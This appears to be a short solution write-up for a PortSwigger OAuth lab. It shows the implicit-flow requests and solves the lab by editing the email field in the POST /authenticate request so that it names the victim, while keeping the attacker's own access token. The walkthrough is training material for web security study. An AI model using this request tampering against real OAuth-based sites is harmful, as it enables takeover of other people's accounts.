# [Lab: Authentication bypass via OAuth implicit flow](https://portswigger.net/web-security/oauth/lab-oauth-authentication-bypass-via-oauth-implicit-flow)

## Lab

This lab uses an OAuth service to allow users to log in with their social media account. Flawed validation by the client application makes it possible for an attacker to log in to other users' accounts without knowing their password.

To solve the lab, log in to Carlos's account. His email address is `carlos@carlos-montoya.net`.

You can log in with your own social media account using the following credentials: `wiener:peter`.

## Analysis

implicit grant type

1. Authorization request

    ```http
    GET /auth?client_id=p447fk5sfcqxon0f46sol&redirect_uri=https://0a110075041e8104c1fc127a0050006f.web-security-academy.net/oauth-callback&response_type=token&nonce=2036205661&scope=openid%20profile%20email HTTP/1.1
    ```

2. User login and consent

    ```http
    POST /interaction/R4FyNIEHjtdvvoYeUxaOp/confirm HTTP/1.1
    ```

3. Access token grant

    ```url
    https://id.web-security-academy.net/oauth-callback#access_token=WEteyVg6x1ph8xvu_EyntalG6PBAo8MQc7sg6PaxvxQ&amp;expires_in=3600&amp;token_type=Bearer&amp;scope=openid%20profile%20email
    ```

4. API call

    ```http
    GET /me HTTP/1.1
    Host: oauth-id.web-security-academy.net
    Authorization: Bearer WEteyVg6x1ph8xvu_EyntalG6PBAo8MQc7sg6PaxvxQ

    HTTP/1.1 200 OK

    {"sub":"wiener","name":"Peter Wiener","email":"wiener@hotdog.com","email_verified":true}
    ```

after:

```http
POST /authenticate HTTP/1.1

{"email":"wiener@hotdog.com","username":"wiener","token":"WEteyVg6x1ph8xvu_EyntalG6PBAo8MQc7sg6PaxvxQ"}
```

## Solutions

intercept the request come after implicit grant type and modify it from:

```http
POST /authenticate HTTP/1.1

{"email":"wiener@hotdog.com","username":"wiener","token":"WEteyVg6x1ph8xvu_EyntalG6PBAo8MQc7sg6PaxvxQ"}
```

to:

```http
POST /authenticate HTTP/1.1

{"email":"carlos@carlos-montoya.net","username":"wiener","token":"WEteyVg6x1ph8xvu_EyntalG6PBAo8MQc7sg6PaxvxQ"}
```

=> server trusts it, solved
